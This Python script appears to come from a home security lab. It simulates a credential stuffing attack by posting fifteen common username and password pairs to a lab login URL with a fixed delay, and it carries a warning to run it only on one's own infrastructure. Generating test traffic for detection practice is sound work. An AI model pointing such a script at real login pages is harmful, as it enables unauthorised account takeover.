#!/usr/bin/env python3
"""
Credential Stuffing Attack Simulation
Tests username:password pairs from "breach data"
Simulates attacker using credentials from other breaches
"""

import requests
import time
from datetime import datetime

# Target configuration
TARGET_URL = "https://jasonklutts.com/lab/login"

# Simulated breach data (username:password pairs)
# In real attacks, these come from actual data breaches
BREACH_CREDENTIALS = [
    ("john.doe", "Summer2023!"),
    ("sarah.smith", "Welcome123"),
    ("admin", "P@ssw0rd"),
    ("michael.jones", "Football1"),
    ("jennifer.wilson", "Princess1"),
    ("robert.brown", "Qwerty123"),
    ("lisa.garcia", "Password1!"),
    ("david.martinez", "Baseball1"),
    ("emily.davis", "Sunshine1"),
    ("james.rodriguez", "Dragon123"),
    ("admin", "admin"),
    ("root", "toor"),
    ("user", "user123"),
    ("test", "test123"),
    ("webadmin", "webadmin123")
]

def attempt_login(username, password):
    """
    Attempt a single login with given credentials
    """
    try:
        data = {
            'username': username,
            'password': password
        }
        
        response = requests.post(TARGET_URL, data=data, verify=True, timeout=10)
        
        return response.status_code
    
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
        return None

def run_credential_stuffing():
    """
    Execute credential stuffing attack
    """
    print("=" * 60)
    print("CREDENTIAL STUFFING ATTACK SIMULATION")
    print("=" * 60)
    print(f"Target: {TARGET_URL}")
    print(f"Credential pairs to test: {len(BREACH_CREDENTIALS)}")
    print(f"Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 60)
    print()
    
    attempts = 0
    
    for i, (username, password) in enumerate(BREACH_CREDENTIALS, 1):
        print(f"[{i}/{len(BREACH_CREDENTIALS)}] Testing: {username}:{password}")
        
        status = attempt_login(username, password)
        attempts += 1
        
        if status == 200:
            print(f"    → Login failed (expected)")
        elif status:
            print(f"    → Status: {status}")
        
        # Realistic delay between attempts
        time.sleep(0.8)
    
    print()
    print("=" * 60)
    print("ATTACK COMPLETE")
    print("=" * 60)
    print(f"Total credential pairs tested: {attempts}")
    print(f"Completed: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print()
    print("Check logs with: python3 analyze_logs.py")
    print("=" * 60)

if __name__ == '__main__':
    print("\n⚠️  WARNING: This is for educational purposes on YOUR OWN infrastructure only\n")
    print("This simulates credential stuffing using breach data")
    print()
    
    response = input("Continue with attack simulation? (yes/no): ")
    
    if response.lower() == 'yes':
        run_credential_stuffing()
    else:
        print("Attack cancelled.")
